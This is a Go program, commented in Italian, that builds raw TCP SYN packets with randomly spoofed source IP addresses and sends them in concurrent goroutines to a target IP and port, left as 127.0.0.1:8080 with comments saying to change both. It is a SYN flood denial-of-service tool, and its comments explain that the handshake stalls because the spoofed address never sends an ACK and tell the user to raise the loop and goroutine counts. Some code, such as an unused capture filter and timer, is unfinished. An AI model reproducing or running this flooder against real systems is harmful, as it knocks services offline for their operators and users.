package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

/*

SYN -> SYN_ACK -> Riposta in stallo a causa di un IP Random dove non verra mai resituita ACK

*/

func main() {

	rand.Seed(time.Now().UnixNano())

	var wg sync.WaitGroup
	/*

		Incrementare i numero di cicli
	*/
	for i := 0; i < 10; i++ {
		/*
			Incrementare le goroutine
		*/
		wg.Add(2)

		go func() {
			defer wg.Done()
			createPacket()
		}()

		go func() {
			defer wg.Done()
			createPacket()
		}()



		time.Sleep(10 * time.Millisecond)
	}

	wg.Wait()
}

func mss(v uint16) []byte {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, v)
	return b
}

func createPacket() {
	iface := "lo0"
	dstIP := net.IPv4(127, 0, 0, 1)//Modificare con IP
	dstPort := layers.TCPPort(8080)//Modificare con port
	srcPort := layers.TCPPort(40000 + rand.Intn(20000))
	seq := uint32(rand.Int31())


	capHandle, err := pcap.OpenLive(iface, 65536, false, pcap.BlockForever)
	if err != nil { log.Fatal(err) }
	defer capHandle.Close()

	filter := fmt.Sprintf(
		"tcp and src host 127.0.0.1 and src port %d and dst port %d",
		dstPort, srcPort,
	)
	if err := capHandle.SetBPFFilter(filter); err != nil {
		log.Fatalf("SetBPFFilter error: %v", err)
	}

	sendHandle, err := pcap.OpenLive(iface, 65536, false, pcap.BlockForever)
	if err != nil { log.Fatal(err) }
	defer sendHandle.Close()

	loop := &layers.Loopback{Family: layers.ProtocolFamilyIPv4}
	ip := &layers.IPv4{
		Version: 4, IHL: 5, TTL: 64,
		SrcIP: net.IPv4(byte(rand.Intn(255)),byte(rand.Intn(255)),byte(rand.Intn(255)),byte(rand.Intn(255))),
		DstIP: dstIP,
		Protocol: layers.IPProtocolTCP,
	}
	tcp := &layers.TCP{
		SrcPort: srcPort, DstPort: dstPort,
		Seq: seq, SYN: true, Window: 64240,
	}
	tcp.SetNetworkLayerForChecksum(ip)

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	if err := gopacket.SerializeLayers(buf, opts, loop, ip, tcp); err != nil {
		log.Fatal("Serialize error:", err)
	}


	if err := sendHandle.WritePacketData(buf.Bytes()); err != nil {
		log.Fatal("WritePacketData error:", err)
	}
	log.Printf(">> SYN %s:%d -> %s:%d (seq=%d)", ip.SrcIP, tcp.SrcPort, ip.DstIP, tcp.DstPort, tcp.Seq)


	timeout := time.NewTimer(5 * time.Second)
	defer timeout.Stop()


}
